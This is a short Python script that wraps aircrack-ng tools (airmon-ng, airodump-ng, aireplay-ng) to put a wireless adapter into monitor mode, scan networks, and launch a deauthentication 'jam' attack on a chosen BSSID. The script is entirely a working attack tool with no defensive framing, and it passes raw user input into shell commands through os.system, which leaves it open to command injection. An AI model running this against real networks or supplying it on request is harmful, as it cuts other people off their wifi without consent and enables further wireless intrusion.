import os


os.system("iwconfig")



print("/n Choose Your Adapter : \n")
adapter=input("( Adapter Name ) : ")
print("/n ADAPTER NAME SAVED")


def monitormode():
    mmd= "airmon-ng start "+adapter
    code1= "airodump-ng "+adapter+"mon"
    os.system(mmd)
    os.system(code1)

def jam():
    bssid= input("( BSSID ) : ")
    attack= input("( Requests ) : ")

    code1="aireplay-ng --deauth "+attack+" -a "+bssid+" "+adapter+"mon"
    os.system(code1)


bash = input ("( Shell ) : ")

if bash == "scan" :
    monitormode()

if bash == "jam" :
    jam()